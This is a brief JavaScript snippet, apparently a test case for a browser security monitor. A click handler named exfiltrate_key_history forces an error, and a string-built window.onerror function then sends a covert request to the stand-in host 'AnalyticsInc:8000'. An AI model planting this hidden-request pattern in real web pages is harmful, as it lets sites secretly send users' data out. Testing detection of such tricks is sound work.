
JAM.startProfile('load');
function exfiltrate_key_history() {
  window.NotExistingFunction()
}
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error1", true);xmlhttp.send(null);';
window.onerror = Function(exp);
document.getElementById("test").onclick = exfiltrate_key_history;

JAM.stopProfile('load');
